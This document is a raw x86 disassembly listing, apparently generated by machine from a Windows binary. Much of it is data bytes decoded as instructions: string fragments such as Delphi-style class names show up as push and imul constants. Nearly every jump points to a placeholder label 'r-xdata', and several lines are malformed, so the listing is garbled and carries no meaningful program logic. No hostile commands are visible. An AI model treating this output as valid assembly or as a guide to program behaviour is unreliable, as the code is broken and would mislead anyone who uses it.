add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax + ebp * 4 + 0x80044 ] bl
add bh bh
popad
js r-xdata
jb r-xdata
dec esp
popad
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add al 0x5
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x44a84401
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esp
dec ebx
jns r-xdata
push 0xb4004010
pop edx
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
xor al 0xa9
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edi + 0x44 ] al
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al dl
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebx + 0xe080044 ]
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x5533ffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax ] ah
mov [ 0xffffffffac840044 ] al
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
and [ edx - 0x537bffbc ] ah
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
push esp
stosd [ edi ]
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x54abffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x52b7ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al ah
lodsb [ esi ]
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ edi ] al
inc esp
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x53c3ffc0 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebp + 0xc080044 ]
push esp
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sbb al 0xaf
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
xor [ esp + eax * 2 ] dh
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
shl [ esp + eax * 2 + 0x44ae9000 ] 0x0
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44b0a4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] al
add [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] cl
mov esp 0x10000044
inc eax
add [ esi + ebp * 4 + 0x44 ] al
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44b01cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4e ] ah
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
movsb [ edi ] [ esi ]
mov al 0x44
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
or [ ebp ] al
cwde
jmp r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
push esp
jmp 0x834b232
add [ eax ] al
pop eax
jo r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] dl
out dx al
inc esp
add [ ebp + edi * 8 + 0x44 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ eax + 0x4800450c ] al
xor al [ eax ]
xor al [ fs : eax ]
sub al 0xea
jo r-xdata
add [ eax + 0x70 ] bl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov [ edi + 0x17080044 ] gs
lea eax [ eax ]
mov esp 0x44b1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] cl
inc esp
add [ esp + esi * 4 ] dh
inc esp
add [ eax ] al
jbe r-xdata
add [ esi ] ah
mov ah 0x44
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x41 ] dh
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] bl
mov cl 0x44
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
add [ eax + 0x19 ] ah
inc ebp
add [ eax + 0xd ] bl
inc ebp
add [ edi + ecx * 4 + 0x19280041 ] ch
inc ebp
add [ ebp * 8 - 0x136fffbc ] ah
inc esp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
add [ edx + ebp * 8 ] ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44b1ee
inc ebp
add ah ch
pop es
inc ebp
add [ eax + ecx - 0x1467ffbb ] bh
inc esp
add ah bl
inc esp
add [ eax - 0xe ] al
inc esp
add [ eax - 0x5 ] ch
inc esp
add al ah
0xeae40044 0x44
sub_44b388
inc esp
add [ eax + 0x1800450d ] ch
or [ ebp ] eax
adc al 0xe
inc ebp
add [ eax ] ch
add eax [ ebp ]
insb
add [ ebp ] eax
or al 0x1d
inc ebp
add [ eax + 0x64004501 ] al
int1
inc esp
add [ ecx + eax + 0x1cc0045 ] ch
inc ebp
add [ eax - 0x23ffbafe ] dl
add al [ ebp ]
fdivr st7
inc esp
add al ch
inc [ eax + eax + 0x70 ]
add [ ebp ] al
push eax
add [ ebp ] al
push esp
add al 0x45
add [ eax + 0x4 ] ch
inc ebp
add [ eax + 0x18 ] ah
inc ebp
add [ eax + 0x1a ] cl
inc ebp
add al ch
0xfac0044 0x45
sub_44b3e2
xor al 0xe
inc ebp
add ah ch
adc [ ebp ] al
xchg esp eax
adc [ ebp ] eax
pushfd
add [ ebp ] al
and bl ch
inc esp
add [ eax - 0x14 ] ah
inc esp
add [ eax - 0x14 ] dh
inc esp
add al bh
0xfb440044 0x44
sub_44b49a
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
push [ eax + esi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x44a13074
add [ eax ] bh
add bh bh
pushad
cli
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
jae r-xdata
add bh bh
mov esp 0xc80044f1
sbb [ ebp ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jb r-xdata
xor al 0x40
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
adc al dh
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x57010000 ]
sbb [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb664c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax - 0x4a ] ah
inc esp
add [ esp + ebx + 0x42 ] ch
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
out 0x44 eax
add [ eax ] bl
sbb al 0x42
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add ah ah
mov esi 0x1d700045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc4b66a
inc ebp
add [ eax + 0x1d ] bh
inc ebp
add ah dh
call 0xffffffffe978b676
inc esp
add [ eax ] ah
call 0xffffffffbfd8b67e
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f8b68a
inc esp
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
sbb bh ah
inc esp
int3
add [ eax + eax ] ah
add [ eax ] al
sub [ esi + 0x34e00044 ] ah
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
call eax
int1
inc esp
add al cl
sbb [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + esi * 4 ] bl
inc esp
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax - 0x4a ] cl
inc esp
jns r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
mov bh 0x44
add [ ebx ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ edi + esi * 4 + 0x44 ] ah
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
mov bh 0x44
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ eax + 0x340044e7 ] bh
sbb al 0x42
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
inc ebp
add [ eax ] al
sbb al 0x42
outsd
jb r-xdata
push ebx
jo r-xdata
mov bh 0x44
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
or [ fs : edx + 0x76 ] ah
add [ edi + esi * 4 + 0x44 ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add al al
mov bh 0x44
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
dec esp
sbb eax 0x1c000045
inc edx
inc eax
int3
add [ ebx + 0x44b7c4c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
mov bh 0x44
mov bh 0x44
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
shl ah 0xb6
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47 ] ch
inc esp
add [ esp + edi * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x5ffbb47 ] al
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
add al 0xb7
inc esp
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push 0x30044b7
add [ eax ] al
jo r-xdata
mov ecx 0xbbfa0044
inc esp
outsd
insb
jae r-xdata
mov eax eax
or [ eax + 0xb010044 ] bh
push esp
inc edx
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
jb r-xdata
inc esp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
add al ah
pop ss
outsd
insb
jae r-xdata
ror [ eax ] 0xb8
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
mov ebx 0x2040044
cli
insb
push edi
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
push 0x45
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb [ 0x66800045 ] 0x45
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0044b9
